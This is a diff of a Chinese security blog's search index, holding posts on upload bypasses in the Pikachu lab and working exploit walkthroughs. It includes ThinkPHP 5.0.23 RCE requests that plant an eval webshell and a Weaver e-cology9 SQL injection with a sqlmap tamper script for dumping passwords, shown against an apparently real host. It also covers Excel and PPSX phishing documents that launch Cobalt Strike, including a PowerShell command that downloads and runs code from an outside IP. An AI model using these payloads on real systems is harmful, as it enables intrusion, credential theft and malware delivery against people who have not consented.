+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
+
+<p>由于后缀为png，所以这里需要配合文件包含进行利用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png</span><br></pre></td></tr></table></figure>
+
+<p>url为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+
+<p>成功连接webshell</p>
+<p><img src="/images/image-20230110133348854.png" alt="image-20230110133348854"></p>
+<h1 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h1><p>MIME类型用来告诉服务器，上传的文件内容是什么类型</p>
+<p>MIME校验就是服务器端限制上传文件的MIME，是一种服务端的校验</p>
+<p>MIME是由上传文件的body的Content-Type指定的</p>
+<p><img src="/images/image-20230110111354014.png" alt="image-20230110111354014"></p>
+<h3 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型"></a>常见的MIME类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">超文本标记语言文本 .html、.html：text/html</span><br><span class="line"></span><br><span class="line"> 普通文本 .txt： text/plain</span><br><span class="line"></span><br><span class="line"> RTF 文本 .rtf： application/rtf</span><br><span class="line"></span><br><span class="line"> GIF 图形 .gif： image/gif</span><br><span class="line"></span><br><span class="line"> JPEG 图形 .jpeg、.jpg： image/jpeg</span><br><span class="line"></span><br><span class="line"> au 声音文件 .au： audio/basic</span><br><span class="line"></span><br><span class="line"> MIDI 音乐文件 mid、.midi： audio/midi、audio/x-midi</span><br><span class="line"></span><br><span class="line"> RealAudio 音乐文件 .ra、.ram： audio/x-pn-realaudio</span><br><span class="line"></span><br><span class="line"> MPEG 文件 .mpg、.mpeg： video/mpeg</span><br><span class="line"></span><br><span class="line"> AVI 文件 .avi： video/x-msvideo</span><br><span class="line"></span><br><span class="line"> GZIP 文件 .gz： application/x-gzip</span><br><span class="line"></span><br><span class="line"> TAR 文件 .tar： application/x-tar</span><br><span class="line"> </span><br><span class="line"> png文件 image/png</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>当上传webshell时</p>
+<p><img src="/images/image-20230110111246587.png" alt="image-20230110111246587"></p>
+<p>此时Content-Type指定的MIME类型为application&#x2F;octet-stream</p>
+<p>将其改为jpg或png的MIME类型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jpg image/jpeg</span><br><span class="line"></span><br><span class="line">png image/png</span><br></pre></td></tr></table></figure>
+
+<p>成功上传</p>
+<p><img src="/images/image-20230110111611594.png" alt="image-20230110111611594"></p>
+<p>成功连接webshell</p>
+<p><img src="/images/image-20230110111625267.png" alt="image-20230110111625267"></p>
+<h1 id="文件上传内容校验绕过"><a href="#文件上传内容校验绕过" class="headerlink" title="文件上传内容校验绕过"></a>文件上传内容校验绕过</h1><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>这里在使用的时候建议直接去修改hex中的16进制</p>
+<h5 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG文件头: 89 50 4E 47 0D 0A 1A 0A </span><br><span class="line"></span><br><span class="line">JPG文件头: FF D8 FF</span><br><span class="line"></span><br><span class="line">GIF (gif)文件头：47494638</span><br></pre></td></tr></table></figure>
+
+<h5 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<h5 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h5><p>16进制文件头为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FF D8 FF</span><br></pre></td></tr></table></figure>
+
+<h5 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h5><p>16进制文件头为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure>
+
+<h5 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Zip Compressed</span><br></pre></td></tr></table></figure>
+
+<h5 id="doc-xls-xlt-ppt-apr"><a href="#doc-xls-xlt-ppt-apr" class="headerlink" title="doc;xls;xlt;ppt;apr"></a>doc;xls;xlt;ppt;apr</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS Compound Document v1 or Lotus Approach APRfile</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>pikachu靶场系列</category>
       </categories>
@@ -2260,87 +2438,6 @@
       </categories>
   </entry>
   <entry>
-    <title>thinkphp 5.0.23-RCE利用</title>
-    <url>/2023/05/18/POC/thinkphp%205.0.23-RCE%E5%88%A9%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="基础payload"><a href="#基础payload" class="headerlink" title="基础payload"></a>基础payload</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Wed, 27 Feb 2019 06:32:09 GMT</span><br><span class="line">If-None-Match: &quot;5c762ee9-5&quot;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 76</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230518090910918.png" alt="image-20230518090910918"></p>
-<h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 135</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=/tmp/sess_5tc1epe1vuk0uqdfssbvvc3pe7&amp;x=phpinfo();</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230517225116294.png" alt="image-20230517225116294"></p>
-<h2 id="构造数据包直接连接webshell"><a href="#构造数据包直接连接webshell" class="headerlink" title="构造数据包直接连接webshell"></a>构造数据包直接连接webshell</h2><p>利用方式和包含日志文件sess_xxxxxxxx类似，需要先将马先写入sess_xxxxxxxx日志文件中</p>
-<p>而这个sess_文件的名称是通过Cookie: PHPSESSID&#x3D;xxxxxxx来指定的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: PHPSESSID=good123123</span><br></pre></td></tr></table></figure>
-
-<p>则日志文件名为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sess_good123123</span><br></pre></td></tr></table></figure>
-
-<p>linux中通常放置于</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/sess_good123123</span><br></pre></td></tr></table></figure>
-
-<h3 id="创建session文件"><a href="#创建session文件" class="headerlink" title="创建session文件"></a>创建session文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=think\Session::set&amp;method=GET&amp;server[REQUEST_METHOD]=&lt;?php eval($_POST[&#x27;abc&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/sess_2333shell</span><br></pre></td></tr></table></figure>
-
-<h5 id="post包"><a href="#post包" class="headerlink" title="post包"></a>post包</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Cookie: PHPSESSID=good123123</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 110</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=think\Session::set&amp;method=GET&amp;server[REQUEST_METHOD]=&lt;?php eval($_POST[&#x27;abc&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230518001530147.png" alt="image-20230518001530147"></p>
-<h5 id="可以查看一下tmp目录"><a href="#可以查看一下tmp目录" class="headerlink" title="可以查看一下tmp目录"></a>可以查看一下tmp目录</h5><p>看一下是否成功写入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 1.1.1.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 77</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls /tmp</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230518001551800.png" alt="image-20230518001551800"></p>
-<h3 id="连接蚁剑"><a href="#连接蚁剑" class="headerlink" title="连接蚁剑"></a>连接蚁剑</h3><p><img src="/images/image-20230518001621137.png" alt="image-20230518001621137"></p>
-<h5 id="设置body"><a href="#设置body" class="headerlink" title="设置body"></a>设置body</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/sess_good123123</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230518001404974.png" alt="image-20230518001404974"></p>
-<h5 id="成功连接"><a href="#成功连接" class="headerlink" title="成功连接"></a>成功连接</h5><p><img src="/images/image-20230518001431455.png" alt="image-20230518001431455"></p>
-<h5 id="看一下sess-xxxxxxxxx文件中的内容"><a href="#看一下sess-xxxxxxxxx文件中的内容" class="headerlink" title="看一下sess_xxxxxxxxx文件中的内容"></a>看一下sess_xxxxxxxxx文件中的内容</h5><p><img src="/images/image-20230518092101501.png" alt="image-20230518092101501"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">think|a:2:&#123;s:28:&quot;&lt;?php eval($_POST[&#x27;abc&#x27;]);?&gt;&quot;;s:0:&quot;&quot;;s:0:&quot;&quot;;s:0:&quot;&quot;;&#125;d2d977c58444271d9c780187e93f80e5|a:2:&#123;s:11:&quot;verify_code&quot;;s:32:&quot;5e3e4963c40c376ff421127ae4342bab&quot;;s:11:&quot;verify_time&quot;;i:1684371746;&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>POC</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>泛微e-cology9 browser.jsp SQL注入</title>
-    <url>/2023/05/05/POC/%E6%B3%9B%E5%BE%AEe-cology9%20browser.jsp%20SQL%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="验证poc"><a href="#验证poc" class="headerlink" title="验证poc"></a>验证poc</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
-
-<p>或者</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/mobile/plugin/browser.js</span><br></pre></td></tr></table></figure>
-
-<p>sql语句经过了三层全字符的url编码</p>
-<p><img src="/images/image-20230505210145029.png" alt="image-20230505210145029"></p>
-<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mobile/%20/plugin/browser.jsp HTTP/1.1</span><br><span class="line">Host: oa.chinataitan.com:8081</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=fr8sbim6j8kssn90m1k7gqt7q5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 651</span><br><span class="line"></span><br><span class="line">isDis=1&amp;browserTypeId=269&amp;keyword=%2525%2536%2531%2525%2532%2537%2525%2532%2530%2525%2537%2535%2525%2536%2565%2525%2536%2539%2525%2536%2566%2525%2536%2565%2525%2532%2530%2525%2537%2533%2525%2536%2535%2525%2536%2563%2525%2536%2535%2525%2536%2533%2525%2537%2534%2525%2532%2530%2525%2533%2531%2525%2532%2563%2525%2532%2537%2525%2532%2537%2525%2532%2562%2525%2532%2538%2525%2535%2533%2525%2534%2535%2525%2534%2563%2525%2534%2535%2525%2534%2533%2525%2535%2534%2525%2532%2530%2525%2534%2530%2525%2534%2530%2525%2535%2536%2525%2534%2535%2525%2535%2532%2525%2535%2533%2525%2534%2539%2525%2534%2566%2525%2534%2565%2525%2532%2539%2525%2532%2562%2525%2532%2537</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424112323042.png" alt="image-20230424112323042"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,&#x27;&#x27;+(SELECT @@VERSION)+&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424112525537.png" alt="image-20230424112525537"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&#x27; union select 1,2222222222&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424135948099.png" alt="image-20230424135948099"></p>
-<p><img src="/images/image-20230424140010831.png" alt="image-20230424140010831"></p>
-<h2 id="sqlmap-tamper"><a href="#sqlmap-tamper" class="headerlink" title="sqlmap tamper"></a>sqlmap tamper</h2><h3 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">import re</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"> </span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    # URL encoding for all characters</span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = &#x27;&#x27;.join([&#x27;%&#x27; + format(ord(c), &#x27;x&#x27;) for c in encoded_payload])</span><br><span class="line"></span><br><span class="line">    encoded_payload = encoded_payload.replace(&#x27; &#x27;, &#x27;%20&#x27;)</span><br><span class="line"></span><br><span class="line">    return encoded_payload</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver.py --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 --tables --batch</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper weaver9.py -p &quot;keyword&quot; --level=5 --risk=2 --tables</span><br></pre></td></tr></table></figure>
-
-<h3 id="获取ecology的用户名密码"><a href="#获取ecology的用户名密码" class="headerlink" title="获取ecology的用户名密码"></a>获取ecology的用户名密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt  --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager --columns</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\t.txt --tamper=&quot;weaver9.py&quot; -p &quot;keyword&quot; --prefix=&quot;a&#x27; union select 1,&#x27;&#x27;+(&quot; --suffix=&quot;)+&#x27;&quot; --level=5 --risk=2 -D ecology -T dbo.hrmresourcemanager -C id,password,loginid --dump</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230424145319892.png" alt="image-20230424145319892"></p>
-]]></content>
-      <categories>
-        <category>POC</category>
-      </categories>
-  </entry>
-  <entry>
     <title>win10启用administrator</title>
     <url>/2023/05/17/windows%E7%9B%B8%E5%85%B3/win10%E5%90%AF%E7%94%A8administrator/</url>
     <content><![CDATA[<h2 id="激活administrator"><a href="#激活administrator" class="headerlink" title="激活administrator"></a>激活administrator</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> net user administrator /active:yes</span><br></pre></td></tr></table></figure>
@@ -2384,27 +2481,6 @@
 ]]></content>
       <categories>
         <category>windows相关</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>PPT动作按钮特性构造PPSX钓鱼</title>
-    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/PPT%E5%8A%A8%E4%BD%9C%E6%8C%89%E9%92%AE%E7%89%B9%E6%80%A7%E6%9E%84%E9%80%A0PPSX%E9%92%93%E9%B1%BC/</url>
-    <content><![CDATA[<p><img src="/images/1665304303218-ef69de94-1746-431c-8a9d-ff7f16229031.png"></p>
-<p><img src="/images/1665305130335-538ccd82-f42b-4f1c-b9c2-2a7fb80997da.png"></p>
-<h5 id="插入–-gt-形状–-gt-工作按钮"><a href="#插入–-gt-形状–-gt-工作按钮" class="headerlink" title="插入–&gt;形状–&gt;工作按钮"></a>插入–&gt;形状–&gt;工作按钮</h5><p><img src="/images/1665304639254-4aa15653-b4fc-4a83-8116-a26f995d6f99.png"></p>
-<h5 id="设置运行程序"><a href="#设置运行程序" class="headerlink" title="设置运行程序"></a>设置运行程序</h5><p><img src="/images/1665307255297-ce6c0fb3-d612-42d9-b39d-0071b65b6da7.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\Desktop\artifact.exe</span><br></pre></td></tr></table></figure>
-
-<h5 id="然后重命名为-ppsx后缀"><a href="#然后重命名为-ppsx后缀" class="headerlink" title="然后重命名为.ppsx后缀"></a>然后重命名为.ppsx后缀</h5><p>注意，如果是用cmd.exe &#x2F;c执行命令，这里不要选择另存为，否则不会执行后续的命令参数</p>
-<p>如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c calc</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/1665307356374-b673f326-a96d-4f18-a2a6-0bed861fc4e1.png"></p>
-<h5 id="双击打开文件，点击按钮即上线"><a href="#双击打开文件，点击按钮即上线" class="headerlink" title="双击打开文件，点击按钮即上线"></a>双击打开文件，点击按钮即上线</h5><p><img src="/images/1665307383696-0f018531-0e2f-4c7f-9a5f-ffe9001c0c95.png"></p>
-<p>该利用方式同时适用于wps</p>
-]]></content>
-      <categories>
-        <category>社工</category>
       </categories>
   </entry>
   <entry>
@@ -2505,32 +2581,21 @@
       </categories>
   </entry>
   <entry>
-    <title>excel钓鱼(office)</title>
-    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/excel%E9%92%93%E9%B1%BC(office)/</url>
-    <content><![CDATA[<h2 id="sheet右键插入"><a href="#sheet右键插入" class="headerlink" title="sheet右键插入"></a>sheet右键插入</h2><p><img src="/images/1665296484752-07145a2a-baec-47ef-ae19-78111d962d71.png"></p>
-<h2 id="选择宏表"><a href="#选择宏表" class="headerlink" title="选择宏表"></a>选择宏表</h2><p><img src="/images/1665296533204-07b5885a-e1a5-4d0c-99a5-905378375f41.png"></p>
-<p>会多出一栏宏</p>
-<p><img src="/images/1665296578713-88797dcc-316d-4eb1-9cdd-b3c75a89ccb9.png"></p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>分别在A1和A2输入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=exec(&quot;c:\windows\system32\cmd.exe&quot;)</span><br><span class="line">=halt()</span><br></pre></td></tr></table></figure>
+    <title>PPT动作按钮特性构造PPSX钓鱼</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/PPT%E5%8A%A8%E4%BD%9C%E6%8C%89%E9%92%AE%E7%89%B9%E6%80%A7%E6%9E%84%E9%80%A0PPSX%E9%92%93%E9%B1%BC/</url>
+    <content><![CDATA[<p><img src="/images/1665304303218-ef69de94-1746-431c-8a9d-ff7f16229031.png"></p>
+<p><img src="/images/1665305130335-538ccd82-f42b-4f1c-b9c2-2a7fb80997da.png"></p>
+<h5 id="插入–-gt-形状–-gt-工作按钮"><a href="#插入–-gt-形状–-gt-工作按钮" class="headerlink" title="插入–&gt;形状–&gt;工作按钮"></a>插入–&gt;形状–&gt;工作按钮</h5><p><img src="/images/1665304639254-4aa15653-b4fc-4a83-8116-a26f995d6f99.png"></p>
+<h5 id="设置运行程序"><a href="#设置运行程序" class="headerlink" title="设置运行程序"></a>设置运行程序</h5><p><img src="/images/1665307255297-ce6c0fb3-d612-42d9-b39d-0071b65b6da7.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\Desktop\artifact.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/1665296646193-cdded01b-6d69-4ba5-ad9e-42875fe1c19c.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">并将A1改为Auto_Open</span><br></pre></td></tr></table></figure>
+<h5 id="然后重命名为-ppsx后缀"><a href="#然后重命名为-ppsx后缀" class="headerlink" title="然后重命名为.ppsx后缀"></a>然后重命名为.ppsx后缀</h5><p>注意，如果是用cmd.exe &#x2F;c执行命令，这里不要选择另存为，否则不会执行后续的命令参数</p>
+<p>如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\cmd.exe /c calc</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/1665296823093-4782b636-fc03-4270-8bc7-9ebd052cb943.png"></p>
-<h5 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h5><p>可能会报如下错误</p>
-<p><img src="/images/1665297307090-b503ddfe-6d8e-486f-982d-24798e81a2df.png"></p>
-<h5 id="单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件"><a href="#单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件" class="headerlink" title="单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件"></a>单击”否”，另存为启用宏的工作薄，保存为xlsm后缀的文件</h5><p><img src="/images/1665297404810-b7af1740-237e-4371-b314-27ae5e4a5b7e.png"></p>
-<h5 id="成功执行系统命令"><a href="#成功执行系统命令" class="headerlink" title="成功执行系统命令"></a>成功执行系统命令</h5><p><img src="/images/1665297687638-e8787e4b-3a56-4594-8007-e6ec0e6723ab.png"></p>
-<h5 id="隐藏"><a href="#隐藏" class="headerlink" title="隐藏"></a>隐藏</h5><p>可以右键将其隐藏</p>
-<p><img src="/images/1665298061106-30f698ba-0e2f-4d9c-b5cc-e994062fe3b0.png"></p>
-<h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>将系统命令替换为CS上线脚本即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://114.55.173.106:12888/a&#x27;))</span><br></pre></td></tr></table></figure>
-
-<p>这里由于excel中公式对单双引号的解析问题，直接贴上去无法执行</p>
-<h5 id="生成exe马"><a href="#生成exe马" class="headerlink" title="生成exe马"></a>生成exe马</h5><p><img src="/images/1665303573348-87529184-2027-4f7a-8c70-ac53c45d5db8.png"></p>
-<p><img src="/images/1665303670194-7cfad13b-5cc5-4c9b-8126-23d0417eae75.png"></p>
-<h5 id="打开文档即上线"><a href="#打开文档即上线" class="headerlink" title="打开文档即上线"></a>打开文档即上线</h5><p><img src="/images/1665303691884-961166e4-dc60-498f-a834-0b8873a8a097.png"></p>
+<p><img src="/images/1665307356374-b673f326-a96d-4f18-a2a6-0bed861fc4e1.png"></p>
+<h5 id="双击打开文件，点击按钮即上线"><a href="#双击打开文件，点击按钮即上线" class="headerlink" title="双击打开文件，点击按钮即上线"></a>双击打开文件，点击按钮即上线</h5><p><img src="/images/1665307383696-0f018531-0e2f-4c7f-9a5f-ffe9001c0c95.png"></p>
+<p>该利用方式同时适用于wps</p>
 ]]></content>
       <categories>
         <category>社工</category>
@@ -2582,6 +2647,38 @@
 
 <h5 id="命令行颜色相关"><a href="#命令行颜色相关" class="headerlink" title="命令行颜色相关"></a>命令行颜色相关</h5><p><img src="/images/1662389741911-16d24671-1089-4391-8d80-37748a3c7d8f.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>社工</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>excel钓鱼(office)</title>
+    <url>/2023/05/17/%E7%A4%BE%E5%B7%A5/excel%E9%92%93%E9%B1%BC(office)/</url>
+    <content><![CDATA[<h2 id="sheet右键插入"><a href="#sheet右键插入" class="headerlink" title="sheet右键插入"></a>sheet右键插入</h2><p><img src="/images/1665296484752-07145a2a-baec-47ef-ae19-78111d962d71.png"></p>
+<h2 id="选择宏表"><a href="#选择宏表" class="headerlink" title="选择宏表"></a>选择宏表</h2><p><img src="/images/1665296533204-07b5885a-e1a5-4d0c-99a5-905378375f41.png"></p>
+<p>会多出一栏宏</p>
+<p><img src="/images/1665296578713-88797dcc-316d-4eb1-9cdd-b3c75a89ccb9.png"></p>
